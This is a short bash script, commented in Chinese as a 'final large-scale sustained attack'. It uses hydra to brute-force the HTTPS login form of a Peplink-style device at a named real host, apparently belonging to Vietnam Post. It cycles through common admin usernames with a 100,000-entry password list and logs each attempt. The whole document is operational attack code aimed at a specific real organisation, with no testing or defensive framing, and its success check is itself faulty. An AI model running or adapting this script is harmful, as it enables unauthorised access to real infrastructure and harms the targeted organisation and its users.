#!/bin/bash
# 最终大规模持续攻击

TARGET="vps.vnpost.vn"
WORDLIST="/root/vnpost_attack/vnpost_massive_100k.txt"
LOG="/root/vnpost_attack/massive_attack.log"

echo "[$(date)] 启动大规模攻击..." | tee -a $LOG
echo "[*] 字典大小: $(wc -l $WORDLIST)" | tee -a $LOG

# 多用户并行
USERS=("admin" "root" "peplink" "administrator" "manager" "vnpost" "balance")

for user in "${USERS[@]}"; do
    echo "[*] 测试用户: $user" | tee -a $LOG
    
    hydra -l $user -P $WORDLIST \
        -s 443 \
        -t 16 \
        -w 5 \
        -f \
        $TARGET \
        https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:F=login_box" \
        2>&1 | tee -a $LOG
    
    if grep -q "valid password found" $LOG | tail -20; then
        echo "[🔥🔥🔥] 成功！" | tee -a $LOG
        exit 0
    fi
    
    sleep 5
done

echo "[$(date)] 大规模攻击完成" | tee -a $LOG
